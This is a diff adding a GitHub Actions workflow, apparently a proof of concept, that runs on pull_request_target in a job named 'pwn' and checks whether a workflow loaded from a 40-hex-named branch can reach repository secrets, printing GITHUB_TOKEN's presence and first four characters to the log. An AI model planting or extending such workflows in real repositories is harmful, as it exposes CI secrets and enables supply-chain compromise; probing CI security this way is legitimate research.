@@ -1,0 +1,18 @@
+name: evil-unique-from-40hex
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: prove workflow loaded from 40hex branch
+        run: |
+          echo "LOADED_FROM_40HEX=YES"
+          echo "actor=${{ github.actor }}"
+          echo "base_ref=${{ github.event.pull_request.base.ref }}"
+          echo "base_sha=${{ github.event.pull_request.base.sha }}"
+          echo "secret_present=${{ secrets.GITHUB_TOKEN != '' }}"
+          echo "token_prefix=${TOKEN:0:4}"
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
